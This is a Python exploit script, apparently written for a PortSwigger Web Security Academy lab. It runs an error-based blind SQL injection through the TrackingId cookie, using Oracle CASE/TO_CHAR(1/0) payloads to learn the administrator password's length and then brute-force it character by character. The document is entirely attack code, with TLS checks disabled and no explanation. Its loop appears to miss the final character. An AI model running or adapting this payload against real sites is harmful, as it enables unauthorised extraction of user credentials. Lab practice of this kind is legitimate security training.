#!/usr/bin/env python3
import requests
from urllib3.exceptions import InsecureRequestWarning
import string

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

alphanumeric = string.ascii_lowercase + string.ascii_uppercase + string.digits
adminpwlen = 0
portswiggerid = "0a1a00720435337180a79eb700b600b0"
URL = "https://" + portswiggerid + ".web-security-academy.net/filter?category=Corporate+gifts"
tc = "sfZ9rqd3Up9NG1d9"
sc = "O8DGknbEFMwPNPtw2oqQ8DwWSrvKhgQa"
#proxy = 'http://127.0.0.1:8080'
'''
proxies = {
    'http': proxy,
    'https': proxy,
}
'''

def ssl_request(url, cookies=None, headers=None, data=None):
    request_params = {'url': url}
    if cookies:
        request_params['cookies'] = cookies
    if headers:
        request_params['headers'] = headers
    if data:
        request_params['data'] = data
    #request_params['proxies'] = proxies
    request_params['verify'] = False
    try:
        response = requests.get(**request_params)
        return response
    except requests.RequestException as e:
        return None

def sqlpoc(injpt):
    payload = "'||(" + injpt + ")||'"
    return payload

def getpwlen(user):
    try:
        for i in range(0, 30):
            num = str(i)
            inj = f"SELECT CASE WHEN LENGTH(password)={num} THEN to_char(1/0) ELSE '' END FROM users WHERE username='{user}'"
            cookie = {'TrackingId': tc + sqlpoc(inj), 'session': sc}
            headers = {'Accept-Encoding':'gzip, deflate, br', 'Accept-Language': 'en-US,en;q=0.9'}
            try: 
                response = ssl_request(URL, cookies=cookie, headers=headers)
                if response.status_code == 500:
                    print(f"PW Length is {i}")
                    return i
                    
            except:
                exit   
    except KeyboardInterrupt:
        print("\nKeyboard Interrupt, exiting")
    
def getuserpw(user, adminpwlen):
    userpw = ""
    try:
        for i in range(1, adminpwlen):
            for c in alphanumeric:
                num = str(i)
                inj = f"SELECT CASE WHEN SUBSTR(password,{i},1)='{c}' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='{user}'"
                cookie = {'TrackingId': tc + sqlpoc(inj), 'session': sc}
                headers = {'Accept-Encoding':'gzip, deflate, br', 'Accept-Language': 'en-US,en;q=0.9'}
                try: 
                    response = ssl_request(URL, cookies=cookie, headers=headers)
                    if response.status_code == 500:
                        print(f"{userpw}", end='\r')
                        userpw += c
                        break
                        
                except:
                    exit
        return userpw
    except KeyboardInterrupt:
        print("\nKeyboard Interrupt, exiting")

user = 'administrator'
adminpwlen = getpwlen(user)
adminpw = getuserpw(user, adminpwlen)
print(f"Admin PW: {adminpw}")
